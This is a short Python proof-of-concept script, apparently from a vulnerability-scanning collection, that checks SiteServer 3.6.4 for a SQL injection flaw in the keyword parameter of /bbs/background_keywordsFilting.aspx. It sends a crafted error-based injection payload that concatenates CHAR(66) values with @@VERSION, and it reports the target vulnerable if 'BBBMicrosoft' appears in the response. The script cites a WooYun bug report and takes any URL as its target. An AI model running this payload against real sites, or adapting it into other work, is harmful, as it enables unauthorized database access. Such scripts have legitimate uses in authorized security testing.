#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: siteserver3.6.4 background_keywordsFilting.aspx注入
referer: http://www.wooyun.org/bugs/wooyun-2013-043641
author: Lucifer
description: 文件/siteserver/bbs/background_keywordsFilting.aspx中,参数Keyword存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['siteserver3.6.4 background_keywordsFilting.aspx注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
